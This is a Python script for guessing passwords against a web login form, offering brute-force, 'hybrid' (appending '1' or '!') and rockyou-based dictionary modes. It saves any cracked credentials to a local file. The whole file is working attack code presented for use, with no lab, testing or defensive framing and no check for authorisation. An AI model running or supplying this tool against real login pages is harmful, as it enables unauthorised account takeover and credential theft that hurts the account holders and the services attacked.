import requests

def brute_force_attack(url, username, password_list):
    for password in password_list:
        response = requests.post(url, data={"username": username, "password": password})
        print(f"Trying password: {password}")
        if "logged in" in response.text.lower():
            print(f"Success! Username: {username}, Password: {password}")
            with open("accounts.txt", "a") as f:
                f.write(f"Username: {username}, Password: {password}\n")
            return True
    return False

def hybrid_attack(url, username, password_list):
    for password in password_list:
        # Try the password with and without 1 or ! at the end
        response1 = requests.post(url, data={"username": username, "password": password})
        response2 = requests.post(url, data={"username": username, "password": password + "1"})
        response3 = requests.post(url, data={"username": username, "password": password + "!"})

        # Check if the login was successful
        print(f"Trying password: {password}")
        if "logged in" in response1.text.lower() or "logged in" in response2.text.lower() or "logged in" in response3.text.lower():
            print(f"Success! Username: {username}, Password: {password}")
            with open("accounts.txt", "a") as f:
                f.write(f"Username: {username}, Password: {password}\n")
            return True
    return False

def dictionary_attack(url, username, wordlist="rockyou.txt"):
    with open(wordlist, 'r', encoding="ansi") as f:
        passwords = f.read().splitlines()
    for password in passwords:
        response = requests.post(url, data={"username": username, "password": password})
        print(f"Trying password: {password}")
        if "logged in" in response.text.lower():
            print(f"Success! Username: {username}, Password: {password}")
            with open("accounts.txt", "a") as f:
                f.write(f"Username: {username}, Password: {password}\n")
            return True
    return False

def main():
    url = input("Enter the URL: ")
    username = input("Enter the username: ")
    attack_type = int(input("Enter the attack type (1 for brute force, 2 for hybrid attack, 3 for dictionary attack): "))
    
    if attack_type == 1:
        password_list_file = input("Enter the password list file path: ")
        if not password_list_file:
            password_list_file = "rockyou.txt"
        with open(password_list_file, 'r', encoding="ansi") as f:
            password_list = f.read().splitlines()
        brute_force_attack(url, username, password_list)
    elif attack_type == 2:
        password_list_file = input("Enter the password list file path: ")
        if not password_list_file:
            password_list_file = "rockyou.txt"
        with open(password_list_file, 'r', encoding="ansi") as f:
            password_list = f.read().splitlines()
        hybrid_attack(url, username, password_list)
    elif attack_type == 3:
        wordlist_file = input("Enter the wordlist file path: ")
        if not wordlist_file:
            wordlist_file = "rockyou.txt"
        dictionary_attack(url, username, wordlist_file)
    else:
        print("Invalid attack type")

if __name__ == "__main__":
    main()
